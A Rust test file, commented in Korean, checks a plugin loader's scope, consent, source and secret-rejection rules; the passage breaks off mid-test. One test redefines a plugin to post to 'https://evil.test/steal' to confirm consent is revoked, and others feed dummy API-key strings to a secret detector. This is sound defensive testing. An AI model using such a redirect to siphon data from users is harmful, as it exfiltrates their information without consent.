//! DEV-375: 정의 적재 · scope · 동의 · 비밀값 거부.
//!
//! 여기서 지키는 것은 **"정의가 git 으로 오는 것" 과 "내 기계에서 도는 것"이
//! 갈려 있다** 는 성질이다. 그게 무너지면 pull 한 순간 남의 코드가 돈다.

use super::consent;
use super::*;
use crate::test_env::env_lock;
use serde_json::json;

fn fresh_tmp(label: &str) -> PathBuf {
    let ns = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let p = std::env::temp_dir().join(format!("og-plug-{label}-{ns}"));
    std::fs::create_dir_all(&p).unwrap();
    p
}

/// 길드 하나와 그 안의 플러그인 정의 하나.
fn write_plugin(guild: &Path, name: &str, body: serde_json::Value) {
    let dir = plugins_dir(guild).join(name);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join(MANIFEST), manifest_text(body)).unwrap();
}

/// 시험을 짧게 쓰려고 **옛 모양**(`on` / `action` / `script`)으로 적은 정의를 새 모양(DEV-403 —
/// `[[handlers]]` 줄)으로 옮긴다. `pre:` 패턴은 `pre` 줄로, 스크립트가 있으면 줄이 `h` 를
/// 부르고 동작은 `[actions.out]` 이 된다. 이미 새 모양이면 그대로 둔다.
fn to_new_shape(mut v: serde_json::Value) -> serde_json::Value {
    let obj = v.as_object_mut().expect("정의는 객체다");
    let on = obj.remove("on");
    let action = obj.remove("action");
    let script = obj.remove("script");
    if on.is_none() && action.is_none() && script.is_none() {
        return v;
    }
    let pats: Vec<String> = on
        .and_then(|o| serde_json::from_value(o).ok())
        .unwrap_or_default();
    let pre: Vec<String> = pats
        .iter()
        .filter_map(|p| p.strip_prefix("pre:").map(str::to_string))
        .collect();
    let post: Vec<String> = pats.iter().filter(|p| !p.starts_with("pre:")).cloned().collect();
    let mut what = serde_json::Map::new();
    match (script, action) {
        (Some(sc), a) => {
            obj.insert("scripts".into(), json!([sc]));
            if let Some(a) = a {
                obj.insert("actions".into(), json!({ "out": a }));
            }
            what.insert("call".into(), json!("h"));
        }
        (None, Some(a)) => {
            what.insert("action".into(), a);
        }
        (None, None) => {}
    }
    let mut handlers = Vec::new();
    for (stage, list) in [("post", post), ("pre", pre)] {
        if !list.is_empty() {
            let mut h = what.clone();
            h.insert(stage.into(), json!(list));
            handlers.push(serde_json::Value::Object(h));
        }
    }
    if handlers.is_empty() {
        handlers.push(serde_json::Value::Object(what));
    }
    obj.insert("handlers".into(), json!(handlers));
    v
}

/// 옛 모양이든 새 모양이든 `plugin.toml` 원문으로.
fn manifest_text(body: serde_json::Value) -> String {
    toml::to_string(&to_new_shape(body)).unwrap()
}

/// 정의의 첫 줄이 가리키는 동작 — 시험에서 전달을 직접 부를 때.
fn first_action(p: &Plugin) -> &Action {
    def_action(&p.def)
}

fn def_action(d: &PluginDef) -> &Action {
    let r = d.handlers[0].action.as_ref().expect("첫 줄이 동작 줄이 아니다");
    d.action_of(r).unwrap()
}

fn ai_notify(scope: &[&str]) -> serde_json::Value {
    json!({
        "name": "ai-notify",
        "on": ["quest.created", "comment.added"],
        "scope": scope,
        "action": { "post": { "url": "https://example.test/hook" } }
    })
}

// ── 적재 ────────────────────────────────────────────────

#[test]
fn no_plugins_dir_is_not_an_error() {
    let g = fresh_tmp("none");
    let l = load_for(&g, Scope::Cli);
    assert!(l.active.is_empty() && l.errors.is_empty());
    let _ = std::fs::remove_dir_all(&g);
}

#[test]
fn scope_decides_where_it_runs() {
    let _guard = env_lock();
    let home = fresh_tmp("scope-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("scope");
    write_plugin(&g, "ai-notify", ai_notify(&["gui"]));

    // GUI 에서는 동의 대상, CLI 에서는 아예 대상이 아니다.
    let gui = load_for(&g, Scope::Gui);
    assert_eq!(gui.needs_consent.len(), 1);
    assert!(gui.out_of_scope.is_empty());

    let cli = load_for(&g, Scope::Cli);
    assert!(cli.needs_consent.is_empty() && cli.active.is_empty());
    assert_eq!(cli.out_of_scope, vec!["ai-notify"]);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **동의 없이는 안 돈다.** 정의가 git 으로 왔다는 것만으로 돌면 안 된다.
#[test]
fn definition_alone_does_not_run() {
    let _guard = env_lock();
    let home = fresh_tmp("consent-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("consent");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));

    let before = load_for(&g, Scope::Cli);
    assert!(before.active.is_empty(), "동의 전에 활성화됐다");
    assert_eq!(before.needs_consent.len(), 1);

    consent::grant(&g, &before.needs_consent[0]).unwrap();
    let after = load_for(&g, Scope::Cli);
    assert_eq!(after.active.len(), 1);
    assert!(after.needs_consent.is_empty());

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **정의가 바뀌면 다시 묻는다.** 어제 동의한 것이 오늘 다른 URL 로 보내고
/// 있을 수 있다 — 이게 원문을 저장하는 이유다.
#[test]
fn changing_the_definition_revokes_consent() {
    let _guard = env_lock();
    let home = fresh_tmp("rehash-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("rehash");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));
    let l = load_for(&g, Scope::Cli);
    consent::grant(&g, &l.needs_consent[0]).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);

    // 같은 이름, 다른 목적지.
    write_plugin(
        &g,
        "ai-notify",
        json!({
            "name": "ai-notify",
            "on": ["quest.created", "comment.added"],
            "scope": ["cli"],
            "action": { "post": { "url": "https://evil.test/steal" } }
        }),
    );
    let after = load_for(&g, Scope::Cli);
    assert!(after.active.is_empty(), "URL 이 바뀌었는데 그대로 돌았다");
    assert_eq!(after.needs_consent.len(), 1);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 옛 파일(신뢰 플래그만 있고 철회 기록이 없음)은 그대로 자동 허용으로 읽히고, 새로 써도
/// 필드 이름이 안 바뀐다 — 설치된 앱이 같은 파일을 읽는다([[BUG-288]]).
#[test]
fn a_legacy_trusted_file_reads_as_auto_allow_and_keeps_its_field_name() {
    let _guard = env_lock();
    let home = fresh_tmp("legacy-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("legacy");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));
    let key = crate::recents::normalize_abs(&g);
    std::fs::write(
        consent::path().unwrap(),
        serde_json::to_string(&json!({ "guilds": {}, "trusted_guilds": [key] })).unwrap(),
    )
    .unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);

    consent::revoke(&g, "ai-notify").unwrap();
    let raw = std::fs::read_to_string(consent::path().unwrap()).unwrap();
    assert!(raw.contains("\"trusted_guilds\""), "{raw}");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

#[test]
fn auto_allow_skips_the_question() {
    let _guard = env_lock();
    let home = fresh_tmp("trust-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("trust");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));
    consent::enable_auto_allow(&g).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);
    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── DEV-399: 길드 밖 소스 ────────────────────────────────

/// 소스로 등록하고 이 길드에서 쓰기로 하면 **길드 폴더 것과 한 목록에** 나온다.
/// 복사는 하지 않는다 — 원본 폴더에서 그대로 적재한다.
#[test]
fn a_plugin_from_a_source_loads_next_to_the_guilds_own() {
    let _guard = env_lock();
    let home = fresh_tmp("src-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("src-guild");
    let outside = fresh_tmp("src-outside");
    write_plugin(&g, "in-guild", json!({
        "name": "in-guild", "on": ["quest.created"], "scope": ["cli"],
        "action": { "post": { "url": "https://example.test/a" } }
    }));
    // 길드 밖 폴더 — `plugins_dir` 규칙과 같게 하위 폴더마다 plugin.toml.
    let ext = outside.join("mine");
    std::fs::create_dir_all(&ext).unwrap();
    std::fs::write(
        ext.join(MANIFEST),
        manifest_text(json!({
            "name": "from-source", "on": ["quest.created"], "scope": ["cli"],
            "action": { "post": { "url": "https://example.test/b" } }
        })),
    )
    .unwrap();

    // 등록만 해서는 안 붙는다 — 쓸 것을 고르는 단계가 따로 있다.
    let src = consent_free_add_source(&g, &outside);
    let before = load_for(&g, Scope::Cli);
    assert_eq!(names(&before), vec!["in-guild"], "등록만으로 붙었다");

    super::sources::use_plugin(&g, &src, "mine").unwrap();
    let after = load_for(&g, Scope::Cli);
    assert_eq!(names(&after), vec!["from-source", "in-guild"]);
    // 출처가 보인다 — 한 목록에 섞이므로.
    let from = after
        .needs_consent
        .iter()
        .find(|p| p.def.name == "from-source")
        .unwrap();
    assert_eq!(from.source.as_deref(), Some(src.as_str()));
    assert_eq!(
        std::fs::canonicalize(&from.dir).unwrap(),
        std::fs::canonicalize(&ext).unwrap(),
        "복사본이 아니라 원본 폴더에서 적재해야 한다"
    );

    // 안 쓰기로 하면 목록에서 빠지고 **파일은 남는다**.
    super::sources::stop_using(&g, "from-source").unwrap();
    assert_eq!(names(&load_for(&g, Scope::Cli)), vec!["in-guild"]);
    assert!(ext.join(MANIFEST).is_file(), "파일을 지웠다");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    for d in [&g, &outside, &home] {
        let _ = std::fs::remove_dir_all(d);
    }
}

/// 이름이 겹치면 **적재에서 거부**한다 — 동의가 이름으로 저장되므로 섞이면 안 된다.
/// 경로가 사라졌으면 조용히 빠지지 않고 이유와 함께 남는다.
#[test]
fn source_plugins_refuse_name_clashes_and_report_missing_paths() {
    let _guard = env_lock();
    let home = fresh_tmp("src2-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("src2-guild");
    let outside = fresh_tmp("src2-outside");
    write_plugin(&g, "dup", ai_notify(&["cli"]));
    let ext = outside.join("dup");
    std::fs::create_dir_all(&ext).unwrap();
    std::fs::write(ext.join(MANIFEST), manifest_text(ai_notify(&["cli"]))).unwrap();
    let src = consent_free_add_source(&g, &outside);
    super::sources::use_plugin(&g, &src, "dup").unwrap();

    let l = load_for(&g, Scope::Cli);
    assert_eq!(names(&l).len(), 1, "겹친 이름이 둘 다 실렸다");
    assert!(
        l.errors.iter().any(|(_, e)| e.contains("겹칩니다") && e.contains("dup")),
        "{:?}",
        l.errors
    );

    // 소스 폴더가 사라지면 — 이유와 함께 목록에 남는다.
    std::fs::remove_dir_all(&outside).unwrap();
    let gone = load_for(&g, Scope::Cli);
    assert!(
        gone.errors
            .iter()
            .any(|(n, e)| n == "dup" && (e.contains("경로에 없습니다") || e.contains("소스"))),
        "사라진 소스가 조용히 빠졌다: {:?}",
        gone.errors
    );

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 소스 등록이 거절해야 하는 것들.
#[test]
fn adding_a_source_refuses_the_useless_cases() {
    let _guard = env_lock();
    let home = fresh_tmp("src3-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("src3-guild");
    write_plugin(&g, "x", ai_notify(&["cli"]));
    let empty = fresh_tmp("src3-empty");

    // 길드 안 — 이미 훑는다.
    let e = super::sources::add_source(&g, &plugins_dir(&g), None).unwrap_err();
    assert!(e.to_string().contains("이미"), "{e}");
    // plugin.toml 이 하나도 없는 폴더.
    let e = super::sources::add_source(&g, &empty, None).unwrap_err();
    assert!(e.to_string().contains(MANIFEST), "{e}");
    // 없는 경로.
    let e = super::sources::add_source(&g, &empty.join("nope"), None).unwrap_err();
    assert!(e.to_string().contains("찾을 수 없"), "{e}");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    for d in [&g, &empty, &home] {
        let _ = std::fs::remove_dir_all(d);
    }
}

/// DEV-400: 화면의 "폴더 하나 골랐다" — 하나면 바로 쓰고, 여럿이면 등록만 한다.
/// 같은 폴더를 다시 골라도 소스가 늘지 않고, 짝으로 뺄 때 다른 소스의 같은 이름은 남는다.
#[test]
fn adding_a_folder_uses_a_lone_plugin_and_lets_you_pick_from_many() {
    use super::sources::{self, AddOutcome};
    let _guard = env_lock();
    let home = fresh_tmp("addf-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("addf-guild");
    let base = fresh_tmp("addf-outside");
    let def = |name: &str| {
        manifest_text(json!({
            "name": name, "on": ["quest.created"], "scope": ["cli"],
            "action": { "post": { "url": "https://example.test/x" } }
        }))
    };
    // 하나짜리 — 폴더 자체가 플러그인.
    let lone = base.join("lone");
    std::fs::create_dir_all(&lone).unwrap();
    std::fs::write(lone.join(MANIFEST), def("echo")).unwrap();
    // 여럿 — 하나는 위와 같은 이름.
    let many = base.join("many");
    for (folder, name) in [("a", "echo"), ("b", "bee")] {
        std::fs::create_dir_all(many.join(folder)).unwrap();
        std::fs::write(many.join(folder).join(MANIFEST), def(name)).unwrap();
    }

    let got = sources::add_folder(&g, &lone).unwrap();
    let AddOutcome::Used { source: lone_src, name, folder } = got.clone() else {
        panic!("하나짜리가 바로 쓰이지 않았다: {got:?}");
    };
    assert_eq!((name.as_str(), folder.as_str()), ("echo", "."));
    assert_eq!(names(&load_for(&g, Scope::Cli)), vec!["echo"]);
    // 같은 폴더를 또 골라도 소스는 하나.
    assert_eq!(sources::add_folder(&g, &lone).unwrap(), got);

    let got = sources::add_folder(&g, &many).unwrap();
    let AddOutcome::Registered { source: many_src, plugins } = got else {
        panic!("여럿인데 통째로 켰다: {got:?}");
    };
    assert_eq!(plugins, 2);
    assert_eq!(names(&load_for(&g, Scope::Cli)), vec!["echo"], "고르기 전에 붙었다");

    let st = sources::status(&g);
    assert_eq!(st.len(), 2);
    let m = st.iter().find(|s| s.name == many_src).unwrap();
    assert!(m.plugins.iter().all(|p| !p.used));
    let l = st.iter().find(|s| s.name == lone_src).unwrap();
    assert!(l.plugins[0].used);

    // 여럿 쪽의 bee 를 고른다.
    sources::use_plugin(&g, &many_src, "b").unwrap();
    assert_eq!(names(&load_for(&g, Scope::Cli)), vec!["bee", "echo"]);
    // 짝으로 빼면 그것만 빠진다.
    sources::stop_using_entry(&g, &many_src, "b").unwrap();
    assert_eq!(names(&load_for(&g, Scope::Cli)), vec!["echo"]);
    assert!(sources::stop_using_entry(&g, &many_src, "b").is_err(), "없는 것을 뺐다고 했다");

    // 소스 폴더가 사라져도 목록에는 남고 이유가 붙는다.
    std::fs::remove_dir_all(&many).unwrap();
    let gone = sources::status(&g).into_iter().find(|s| s.name == many_src).unwrap();
    assert!(gone.problem.is_some(), "사라진 소스가 조용하다");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    for d in [&g, &base, &home] {
        let _ = std::fs::remove_dir_all(d);
    }
}

fn consent_free_add_source(guild: &Path, dir: &Path) -> String {
    super::sources::add_source(guild, dir, None).unwrap()
}

fn names(l: &Loaded) -> Vec<String> {
    let mut v: Vec<String> = l
        .active
        .iter()
        .chain(l.needs_consent.iter())
        .map(|p| p.def.name.clone())
        .collect();
    v.sort();
    v
}

/// 깨진 정의 하나가 나머지를 막지 않는다.
#[test]
fn one_broken_definition_does_not_block_the_rest() {
    let _guard = env_lock();
    let home = fresh_tmp("broken-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("broken");
    std::fs::create_dir_all(plugins_dir(&g).join("broken")).unwrap();
    std::fs::write(plugins_dir(&g).join("broken").join(MANIFEST), "name = ").unwrap();
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));
    consent::enable_auto_allow(&g).unwrap();

    let l = load_for(&g, Scope::Cli);
    assert_eq!(l.active.len(), 1, "깨진 이웃 때문에 멀쩡한 것이 안 실렸다");
    assert_eq!(l.errors.len(), 1);
    assert!(l.errors[0].0 == "broken");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── 검증 ────────────────────────────────────────────────

fn def(action: Action) -> PluginDef {
    PluginDef {
        name: "p".into(),
        description: None,
        scope: vec![Scope::Cli],
        scripts: Vec::new(),
        actions: Default::default(),
        handlers: vec![Handler {
            id: None,
            when: Default::default(),
            with: Vec::new(),
            pre: Vec::new(),
            post: vec!["quest.created".into()],
            call: None,
            action: Some(ActionRef::Inline(action)),
        }],
        inputs: Vec::new(),
    }
}

/// 첫 줄의 동작은 두고 "언제" 만 옛 표기로 바꾼다 — `pre:` 가 섞이면 줄이 둘이 된다.
fn set_on(d: &mut PluginDef, pats: &[&str]) {
    let action = d.handlers[0].action.clone();
    let mut v = to_new_shape(json!({ "on": pats, "action": "x" }));
    let mut hs: Vec<Handler> = serde_json::from_value(v["handlers"].take()).unwrap();
    for h in &mut hs {
        h.action = action.clone();
    }
    d.handlers = hs;
}

#[test]
fn scope_must_be_explicit() {
    let mut d = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    d.scope.clear();
    let e = validate(&d).unwrap_err().to_string();
    assert!(e.contains("scope"), "{e}");
}

#[test]
fn empty_subscription_is_rejected() {
    let mut d = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    d.handlers.clear();
    assert!(validate(&d).is_err());
}

/// DEV-381: **없는 phase 도 적재 때 걸린다.** 오타 난 이름은 잡으면서
/// `pre:quest.created` 는 통과시켰는데, 그건 아무 오류 없이 영원히 안 도는
/// 구독이었다 — 이 저장소가 제일 싫어하는 조용한 실패다.
#[test]
fn subscribing_to_a_phase_that_never_fires_is_caught_at_load() {
    let mut d = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    // 이름은 맞지만 이 이벤트는 pre 를 안 낸다.
    set_on(&mut d, &["pre:quest.created"]);
    let e = validate(&d).unwrap_err().to_string();
    assert!(e.contains("pre"), "{e}");

    // 실제로 pre 를 내는 것은 통과한다.
    set_on(&mut d, &["pre:comment.added", "pre:quest.deleted"]);
    assert!(validate(&d).is_ok());
    // 와일드카드는 하나라도 맞으면 통과한다.
    set_on(&mut d, &["pre:*"]);
    assert!(validate(&d).is_ok());
    set_on(&mut d, &["pre:comment.*"]);
    assert!(validate(&d).is_ok());
    // 아무것과도 안 맞는 pre 와일드카드는 막는다.
    set_on(&mut d, &["pre:campaign.*"]);
    assert!(validate(&d).is_err());
}

/// 오타 난 이벤트 이름은 **조용히 안 도는** 대신 적재 때 걸린다.
#[test]
fn unknown_event_name_is_caught_at_load() {
    let mut d = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    set_on(&mut d, &["quest.creted"]);
    let e = validate(&d).unwrap_err().to_string();
    assert!(e.contains("quest.creted"), "{e}");
    // 와일드카드는 통과해야 한다.
    set_on(&mut d, &["quest.*", "pre:*"]);
    assert!(validate(&d).is_ok());
}

// ── 비밀값 (admin 확정: 거부) ─────────────────────────────

fn post_with_header(k: &str, v: &str) -> PluginDef {
    let mut h = BTreeMap::new();
    h.insert(k.to_string(), v.to_string());
    def(Action::Post {
        url: "https://x.test".into(),
        headers: h,
        body_env: Default::default(),
        timeout_ms: None,
    })
}

#[test]
fn literal_api_key_in_header_is_rejected() {
    let e = validate(&post_with_header(
        "Authorization",
        "Bearer abcd1234abcd1234abcd",
    ))
    .unwrap_err()
    .to_string();
    assert!(e.contains("비밀값"), "{e}");
}

#[test]
fn env_reference_is_accepted() {
    assert!(
        validate(&post_with_header(
            "Authorization",
            "Bearer ${OPENAI_API_KEY}"
        ))
        .is_ok()
    );
    assert!(validate(&post_with_header("X-Api-Key", "${MY_KEY}")).is_ok());
}

/// 접두사가 알려진 키는 **어디에 있든** 잡는다 — URL 에 박아 넣는 경우가 흔하다.
#[test]
fn known_key_prefix_is_rejected_anywhere() {
    let d = def(Action::Post {
        url: "https://api.test/v1?key=sk-abcdef123456".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    assert!(validate(&d).is_err());
    let d2 = def(Action::Run {
        command: "curl".into(),
        args: vec!["-H".into(), "Authorization: ghp_xxxxxxxxxxxx".into()],
        timeout_ms: None,
        os: Default::default(),
    });
    assert!(validate(&d2).is_err());
}

/// 넓게 잡으면 멀쩡한 값이 막힌다 — 평범한 헤더는 통과해야 한다.
#[test]
fn ordinary_values_are_not_flagged() {
    assert!(validate(&post_with_header("Content-Type", "application/json")).is_ok());
    assert!(validate(&post_with_header("X-Source", "openguild")).is_ok());
    let d = def(Action::Run {
        command: "/usr/local/bin/notify".into(),
        args: vec!["--quiet".into()],
        timeout_ms: None,
        os: Default::default(),
    });
    assert!(validate(&d).is_ok());
}

#[test]
fn env_expansion_fails_loudly_when_unset() {
    let _guard = env_lock();
    unsafe { std::env::set_var("OG_TEST_PLUGIN_VAR", "shhh") };
    assert_eq!(
        expand_env("Bearer ${OG_TEST_PLUGIN_VAR}").unwrap(),
        "Bearer shhh"
    );
    unsafe { std::env::remove_var("OG_TEST_PLUGIN_VAR") };
    // 없는 변수를 빈 문자열로 채우면 인증 없이 요청이 나가고 원인을 못 찾는다.
    assert!(expand_env("${OG_TEST_PLUGIN_VAR}").is_err());
}

/// **`run` 은 임의 실행이다.** 동의 없이는 절대 안 실린다([[DEV-377]]).
#[test]
fn a_run_action_never_loads_without_consent() {
    let _guard = env_lock();
    let home = fresh_tmp("run-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("run");
    write_plugin(
        &g,
        "shell",
        json!({
            "name": "shell",
            "on": ["quest.created"],
            "scope": ["cli"],
            "action": { "run": { "command": "/usr/local/bin/notify", "args": ["--quiet"] } }
        }),
    );

    let before = load_for(&g, Scope::Cli);
    assert!(before.active.is_empty(), "동의 없이 임의 실행이 실렸다");
    assert_eq!(before.needs_consent.len(), 1);

    consent::grant(&g, &before.needs_consent[0]).unwrap();
    let after = load_for(&g, Scope::Cli);
    assert_eq!(after.active.len(), 1);
    assert!(matches!(first_action(&after.active[0]), Action::Run { .. }));

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// DEV-383: **이름이 겹치면 안 실린다.** 동의도 화면도 이름으로 구분하는데
/// 둘이면 어느 쪽인지 알 수 없고, 프런트의 `{#each}` 키도 이름이라 화면이
/// 통째로 깨졌다. 폴더를 복사하고 이름을 안 고치는 건 흔한 실수다.
#[test]
fn a_duplicate_plugin_name_is_rejected_not_silently_merged() {
    let _guard = env_lock();
    let home = fresh_tmp("dup-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("dup");
    // 폴더는 둘, 이름은 하나.
    write_plugin(&g, "slack", ai_notify(&["cli"]));
    write_plugin(&g, "slack-staging", ai_notify(&["cli"]));
    consent::enable_auto_allow(&g).unwrap();

    let l = load_for(&g, Scope::Cli);
    assert_eq!(l.active.len(), 1, "겹친 이름이 둘 다 실렸다");
    assert_eq!(l.errors.len(), 1, "겹친 것을 조용히 버렸다");
    assert!(l.errors[0].1.contains("겹칩니다"), "{:?}", l.errors);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── DEV-385: 동의 파일을 잃지 않는다 ────────────────────

/// **못 읽는 동의 파일을 덮어쓰지 않는다.**
///
/// 이 파일에는 이 기계의 **모든** 동의가 들어 있다. 예전에는 파싱 실패를 빈
/// 상태로 갈음하고 그대로 덮어써서, 한 번 깨진 파일이 곧 "동의 전부 소멸"
/// 이었다. 사용자는 왜 갑자기 다시 물어보는지 알 수 없다.
#[test]
fn a_corrupt_consent_file_is_never_overwritten() {
    let _guard = env_lock();
    let home = fresh_tmp("corrupt-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("corrupt");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));

    // 먼저 정상 동의를 하나 남긴다.
    let l = load_for(&g, Scope::Cli);
    consent::grant(&g, &l.needs_consent[0]).unwrap();
    let path = consent::path().unwrap();
    let good = std::fs::read_to_string(&path).unwrap();
    assert!(good.contains("ai-notify"));

    // 파일이 깨진다(디스크 오류, 손편집, 다른 버전…).
    std::fs::write(&path, "{ 이건 JSON 이 아니다").unwrap();
    let err = consent::enable_auto_allow(&g).unwrap_err().to_string();
    assert!(err.contains("동의가 전부 사라지므로"), "{err}");
    assert_eq!(
        std::fs::read_to_string(&path).unwrap(),
        "{ 이건 JSON 이 아니다",
        "깨진 파일을 덮어써 버렸다"
    );

    // 읽기는 안전한 쪽으로 떨어진다 — 아무것도 안 돈다.
    let after = load_for(&g, Scope::Cli);
    assert!(after.active.is_empty());

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 쓰기가 원자적이다 — 임시 파일을 남기지 않는다.
#[test]
fn consent_write_leaves_no_temp_file() {
    let _guard = env_lock();
    let home = fresh_tmp("atomic-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("atomic");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));
    consent::enable_auto_allow(&g).unwrap();

    let leftovers: Vec<_> = std::fs::read_dir(&home)
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().to_string())
        .filter(|n| n.contains("tmp"))
        .collect();
    assert!(leftovers.is_empty(), "임시 파일이 남았다: {leftovers:?}");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── DEV-384: 함께 배포하는 예제 ─────────────────────────

/// **예제가 안 도는 건 없느니만 못하다.**
///
/// `examples/plugins/` 는 사용자가 복사해 쓰라고 두는 것이다. 정의가 검증을 못
/// 넘거나 스크립트가 컴파일이 안 되면, 처음 써 보는 사람이 자기가 뭘 잘못했나
/// 하고 헤맨다. 실제로 적재해 본다.
#[test]
fn shipped_examples_all_load() {
    let _guard = env_lock();
    let home = fresh_tmp("examples-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let src = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../examples/plugins");
    assert!(src.is_dir(), "예제 폴더가 없다: {}", src.display());

    // 예제를 진짜 길드에 복사해 넣고 그대로 적재한다.
    let g = fresh_tmp("examples");
    let dest = plugins_dir(&g);
    std::fs::create_dir_all(&dest).unwrap();
    let mut names = Vec::new();
    for e in std::fs::read_dir(&src).unwrap().flatten() {
        if !e.path().is_dir() {
            continue;
        }
        let name = e.file_name();
        let to = dest.join(&name);
        std::fs::create_dir_all(&to).unwrap();
        for f in std::fs::read_dir(e.path()).unwrap().flatten() {
            std::fs::copy(f.path(), to.join(f.file_name())).unwrap();
        }
        names.push(name.to_string_lossy().to_string());
    }
    assert!(
        names.len() >= 3,
        "예제가 {}개뿐이다: {names:?}",
        names.len()
    );
    consent::enable_auto_allow(&g).unwrap();

    let l = load_all(&g);
    assert!(
        l.errors.is_empty(),
        "예제가 적재에 실패했다 — 복사해 쓰는 사람은 자기 탓인 줄 안다: {:?}",
        l.errors
    );
    assert_eq!(l.active.len(), names.len(), "적재된 수가 안 맞는다");

    // 각 예제가 어느 축을 보여주는지 — 하나로 몰리면 예제 구실을 못 한다.
    let kinds: std::collections::BTreeSet<&str> = l
        .active
        .iter()
        .flat_map(|p| p.def.all_actions().into_iter().map(|(_, a)| a.kind()))
        .collect();
    assert!(kinds.contains("post") && kinds.contains("run"), "{kinds:?}");
    assert!(
        l.active.iter().any(|p| !p.def.scripts.is_empty()),
        "스크립트를 쓰는 예제가 없다"
    );
    assert!(
        l.active.iter().any(|p| p.def.scripts.is_empty()),
        "스크립트 없이 도는 예제가 없다 — 그것도 되는 길이다"
    );
    assert!(
        l.active
            .iter()
            .any(|p| p.def.handlers.iter().any(|h| !h.pre.is_empty())),
        "바뀌기 전(pre) 단계를 쓰는 예제가 없다"
    );
    assert!(
        l.active.iter().any(|p| p.def.handlers.len() > 1),
        "한 플러그인이 여러 줄을 쓰는 예제가 없다"
    );

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── DEV-380: 리뷰 지적 ──────────────────────────────────

/// **`sk-` 는 영어 단어 꼬리에 흔하다.** `contains` 로 보면 `task-runner`,
/// `desk-notify`, `risk-eval` 이 전부 API 키로 걸려 적재를 거부당한다.
#[test]
fn ordinary_words_ending_in_sk_are_not_api_keys() {
    for url in [
        "https://api.test/task-runner",
        "https://risk-eval.example/hook",
        "https://example.test/disk-usage",
    ] {
        let d = def(Action::Post {
            url: url.into(),
            headers: Default::default(),
            body_env: Default::default(),
            timeout_ms: None,
        });
        assert!(validate(&d).is_ok(), "멀쩡한 URL 이 막혔다: {url}");
    }
    let d = def(Action::Run {
